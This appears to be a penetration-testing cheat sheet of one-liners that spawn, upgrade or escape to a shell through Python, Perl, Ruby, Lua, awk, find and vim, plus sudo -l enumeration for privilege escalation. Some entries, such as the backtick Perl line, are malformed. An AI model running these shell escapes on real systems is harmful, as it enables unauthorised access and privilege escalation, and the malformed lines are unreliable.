**Python**
```python
python -c 'import pty; pty.spawn("/bin/sh")'
```


**/bin/sh -i**
```bash
/bin/sh -i
```

**Perl**
```perl
perl -e `exec "/bin/sh";`
```

The below should be run from a script

```perl
perl: exec "/bin/sh";
```

**Ruby**...run from a script
```bash
ruby: exec "/bin/sh"
```

**Lua**...run from a script
```bash
lua: os.execute('/bin/sh')
```

**AWK**
```bash
awk 'BEGIN {system("/bin/sh")}'
```

**Find**
```bash
find / -name /nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

**Using Exec to Launch a Shell**
```bash
find . -exec /bin/sh \; -quit
```

**VIM to Shell**
```bash
vim -c ':!/bin/sh'
```

**VIM Escape**
```bash
vim
:set shell=/bin/sh
:shell
```

**Permissions**
```bash
ls -la <path/to/fileorbinary>
```

**Sudo -l**
```bash
sudo -l
```




